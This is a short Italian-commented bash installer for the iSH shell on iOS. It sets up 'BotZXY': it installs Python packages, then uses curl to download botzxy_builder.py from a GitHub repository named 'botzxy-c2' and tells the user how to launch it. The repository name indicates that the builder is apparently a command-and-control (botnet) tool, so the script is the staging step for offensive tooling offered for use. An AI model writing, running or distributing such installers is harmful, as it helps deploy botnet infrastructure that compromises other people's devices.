#!/bin/bash
# BotZXY - Installazione per iSH (iOS)

echo "========================================"
echo "   BotZXY - Installazione iSH"
echo "========================================"

# Aggiorna iSH
apk update && apk upgrade

# Installa Python
apk add python3 py3-pip

# Installa pacchetti
pip3 install requests pillow

# Crea struttura
mkdir -p ~/botzxy_builder
cd ~/botzxy_builder

# Scarica il builder
echo "Download botzxy_builder.py..."
curl -sSL https://raw.githubusercontent.com/davideusai913-gif/botzxy-c2/main/botzxy_builder.py -o botzxy_builder.py

echo ""
echo "========================================"
echo "   ✅ Installazione iSH completata!"
echo "========================================"
echo ""
echo "Avvia il builder con:"
echo "  cd ~/botzxy_builder && python3 botzxy_builder.py"
echo ""